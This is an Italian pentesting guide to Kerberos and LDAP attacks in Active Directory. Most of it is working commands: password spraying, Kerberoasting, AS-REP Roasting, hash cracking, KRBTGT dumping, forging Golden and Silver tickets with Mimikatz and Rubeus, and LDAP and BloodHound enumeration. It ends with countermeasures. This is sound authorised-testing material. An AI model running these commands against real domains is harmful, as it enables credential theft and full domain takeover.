# Kerberos & LDAP Attacks

## Scopo

Questa guida copre le vulnerabilità e le tecniche di attacco relative a Kerberos e LDAP in ambienti Active Directory, inclusi Kerberoasting, AS-REP Roasting e enumerazione LDAP.

## Prerequisiti

- Kali Linux o distribuzione con tool di pentesting
- Impacket, Rubeus, BloodHound
- Accesso alla rete del dominio
- **Autorizzazione scritta** per i test
- Conoscenza di Active Directory

## Installazione

```bash
# Impacket
sudo apt-get install python3-impacket

# Kerbrute
go install github.com/ropnop/kerbrute@latest

# BloodHound
sudo apt-get install bloodhound neo4j
```

---

# KERBEROS

## Panoramica

```
1. AS-REQ: Client chiede TGT al KDC
2. AS-REP: KDC risponde con TGT (cifrato con hash utente)
3. TGS-REQ: Client presenta TGT per servizio
4. TGS-REP: KDC risponde con TGS (cifrato con hash servizio)
5. AP-REQ: Client presenta TGS al servizio
```

---

## User Enumeration

### Kerbrute

```bash
# Enumera utenti validi
kerbrute userenum -d domain.com users.txt --dc dc.domain.com

# Brute force password
kerbrute bruteuser -d domain.com passwords.txt username --dc dc.domain.com

# Password spray
kerbrute passwordspray -d domain.com users.txt 'Password123' --dc dc.domain.com
```

### Nmap

```bash
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt target
```

---

## Kerberoasting

Estrae hash TGS di account di servizio (SPN configurato) per cracking offline.

### Con Impacket

```bash
# Con credenziali valide
impacket-GetUserSPNs -request -dc-ip DC_IP domain/user:password

# Output in formato hashcat
impacket-GetUserSPNs -request -dc-ip DC_IP domain/user:password -outputfile hashes.txt
```

### Con Rubeus (Windows)

```powershell
# Kerberoast tutti i servizi
Rubeus.exe kerberoast /outfile:hashes.txt

# Targeting specifico
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

# Con credenziali alternative
Rubeus.exe kerberoast /creduser:domain\user /credpassword:password
```

### Cracking

```bash
# Hashcat (mode 13100 per TGS-REP)
hashcat -m 13100 hashes.txt wordlist.txt

# John
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

---

## AS-REP Roasting

Estrae hash AS-REP per utenti con pre-auth disabilitata.

### Trova Utenti Vulnerabili

```bash
# Con Impacket
impacket-GetNPUsers -dc-ip DC_IP domain/ -usersfile users.txt -format hashcat

# Con credenziali
impacket-GetNPUsers -dc-ip DC_IP domain/user:password -request
```

### Con Rubeus

```powershell
# Tutti gli utenti vulnerabili
Rubeus.exe asreproast /outfile:hashes.txt

# Utente specifico
Rubeus.exe asreproast /user:victim /outfile:hash.txt
```

### Cracking

```bash
# Hashcat (mode 18200 per AS-REP)
hashcat -m 18200 hashes.txt wordlist.txt
```

---

## Golden Ticket

Forgia TGT usando hash KRBTGT (richiede compromissione DC).

### Ottenere Hash KRBTGT

```bash
# Dump NTDS
impacket-secretsdump -just-dc-user KRBTGT domain/admin@DC

# Output
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH:::
```

### Creare Golden Ticket

```powershell
# Mimikatz
kerberos::golden /user:FakeAdmin /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:HASH /user:FakeAdmin /domain:domain.com /sid:S-1-5-21-... /ptt
```

---

## Silver Ticket

Forgia TGS per servizio specifico usando hash account servizio.

```powershell
# Mimikatz
kerberos::golden /user:FakeUser /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:cifs /rc4:SERVICE_HASH /ptt
```

---

# LDAP

## Enumerazione LDAP

### Query Anonima

```bash
# Test binding anonimo
ldapsearch -x -H ldap://dc.domain.com -b "dc=domain,dc=com" -s base

# Enumerazione base
ldapsearch -x -H ldap://dc.domain.com -b "dc=domain,dc=com" "(objectClass=*)"
```

### Con Credenziali

```bash
# Tutti gli utenti
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -W -b "dc=domain,dc=com" "(objectClass=user)"

# Utenti con SPN (per Kerberoasting)
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -W -b "dc=domain,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Utenti senza pre-auth (per AS-REP Roasting)
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -W -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

# Admin del dominio
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -W -b "dc=domain,dc=com" "(memberOf=CN=Domain Admins,CN=Users,dc=domain,dc=com)"
```

### Ldapdomaindump

```bash
# Dump completo
ldapdomaindump -u 'domain\user' -p 'password' dc.domain.com

# Genera file HTML, JSON, grep-friendly
```

### Windapsearch

```bash
# Utenti
windapsearch -u user@domain.com -p password -d dc.domain.com --users

# Gruppi
windapsearch -u user@domain.com -p password -d dc.domain.com --groups

# Computer
windapsearch -u user@domain.com -p password -d dc.domain.com --computers

# Privileged users
windapsearch -u user@domain.com -p password -d dc.domain.com --da
```

---

## BloodHound

### Collezione Dati

```bash
# SharpHound (Windows)
SharpHound.exe -c All

# bloodhound-python (Linux)
bloodhound-python -u user -p password -d domain.com -dc dc.domain.com -c All

# Output: file .json per import
```

### Analisi

```bash
# Avvia neo4j
sudo neo4j console

# Avvia BloodHound
bloodhound

# Import dati e analizza path di attacco
```

### Query Utili

```cypher
# Shortest path to Domain Admins
MATCH (n:User),(m:Group {name:'DOMAIN ADMINS@DOMAIN.COM'}),p=shortestPath((n)-[*1..]->(m)) RETURN p

# Kerberoastable users
MATCH (u:User) WHERE u.hasspn=true RETURN u.name

# AS-REP Roastable
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name
```

---

## Contromisure

### Kerberoasting

- Password complesse per account servizio (25+ caratteri)
- Managed Service Accounts (gMSA)
- Monitora richieste TGS anomale (Event ID 4769)

### AS-REP Roasting

- Non disabilitare pre-authentication
- Audit account con flag DONT_REQUIRE_PREAUTH

### LDAP

- Disabilita LDAP anonimo
- Usa LDAPS (porta 636)
- Implementa LDAP signing

### Generale

- Protected Users group
- Credential Guard
- Tiered administration
- PAW per admin

---

## Best Practices

- **Password forti**: Specialmente per account servizio
- **gMSA**: Usa Managed Service Accounts
- **Monitoring**: SIEM per eventi Kerberos sospetti
- **Least privilege**: Limita account con SPN
- **Audit**: Verifica periodicamente configurazioni AD
- **BloodHound**: Usa per identificare path di attacco

## Riferimenti

- [Harmj0y's Blog](https://blog.harmj0y.net/)
- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [MITRE ATT&CK - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
